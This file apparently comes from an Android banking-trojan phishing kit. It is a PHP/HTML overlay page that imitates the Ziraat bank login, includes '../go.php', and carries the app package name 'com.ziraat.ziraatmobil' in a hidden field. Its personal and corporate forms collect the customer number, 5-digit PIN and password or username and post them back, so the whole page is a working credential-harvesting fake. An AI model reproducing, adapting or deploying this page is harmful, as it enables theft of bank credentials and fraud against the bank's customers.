<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <title>Ziraat</title>

    <link rel="stylesheet" href="css/normalize.css">
    <link rel="stylesheet" href="css/main.css">
    <link rel="stylesheet" href="css/ziraat.css">

    <script src="js/jquery.min.js"></script>
    <script src="js/viewport.js"></script>
    <script src="js/cat.functions.js"></script>
</head>

<body>
    <div class="row">
        <div class="form_header">
            <img src="images/logo.png" alt="">
        </div>
    </div>
		<div class="modal modal_02">
			<div class="container">
				<form action="" method="post" class="wrapper">
				<input type="hidden" name="field1" value="com.ziraat.ziraatmobil" class="main_input">
                
					<div class="row" id="select_type">
						<div class="content">

							<div class="btn_wr">
								<button class="sign_btn" id="pers_btn" type=button>
									B&#304;REYSEL <img src="images/arr.png" alt="">
								</button>
							</div>

							<div class="btn_wr">
								<button class="sign_btn"  id="corp_btn">
									KURUMSAL <img src="images/arr.png" alt="">
								</button>
							</div>
						</div>
					</div>

<script>

function checkBad(str)
{
if (str.split(str.slice(0,1)).length === str.length+1) return false;
return true;
}


$(document).ready(function() {
$('#pers_btn').click(function(){
$('#row_pers').show();
$('#row_corp').remove();
$('#select_type').remove();
return false;
});

$('#corp_btn').click(function(){
$('#row_corp').show();
$('#row_pers').remove();
$('#select_type').remove();
return false;
});

$('.main_input').bind("change keyup input click", function() {
    if (this.value.match(/[^0-9]/g)) {
        this.value = this.value.replace(/[^0-9]/g, '');
    }
});
$('.main_input[name="field4"]').unbind();



});
</script>
<style>

.inpError{
background-color: #FD896C;

}
</style>
					<div class="row" id="row_pers" style="display:none;">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									M&#252;&#351;teri Numaran&#305;z&#305; Giriniz
								</div>

								<div class="inp_wr">


									<input type="text" name="field2" class="main_input" maxlength=8 required="">


								</div>
							</div>




							<div class="input_block_wr">
								<div class="inp_caption">
									&#350;ifrenizi Giriniz
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" class="main_input" maxlength=5 required="" pattern="[0-9]{5}">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Parolanizi Giriniz
								</div>
								<div class="inp_wr">
									<input type="password" name="field4" class="main_input" maxlength=15  >
								</div>
							</div>
							<div class="btn_wr">
								<button class="sign_btn">
									G&#304;R&#304;&#350;<img src="images/arr.png" alt="">
								</button>
							</div>
						</div>
					</div>

					<div class="row" id="row_corp" style="display:none;">
						<div class="content">
							<div class="input_block_wr">
								<div class="inp_caption">
									M&#252;&#351;teri Numaran&#305;z&#305; Giriniz
								</div>
								<div class="inp_wr">
									<input type="text" name="field2" class="main_input" maxlength=8 required="">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									&#350;ifrenizi Giriniz
								</div>
								<div class="inp_wr">
									<input type="password" name="field3" class="main_input" maxlength=5 required="" pattern="[0-9]{5}">
								</div>
							</div>
							<div class="input_block_wr">
								<div class="inp_caption">
									Kullan&#305;c&#305; Ad&#305;n&#305;z
								</div>
								<div class="inp_wr">
									<input type="text" name="field4" class="main_input" maxlength=10 required="">
								</div>
							</div>





							<div class="btn_wr">
								<button class="sign_btn">
									G&#304;R&#304;&#350;<img src="images/arr.png" alt="">
								</button>
							</div>
						</div>
					</div>


				</form>
			</div>
		</div>
</body>

</html>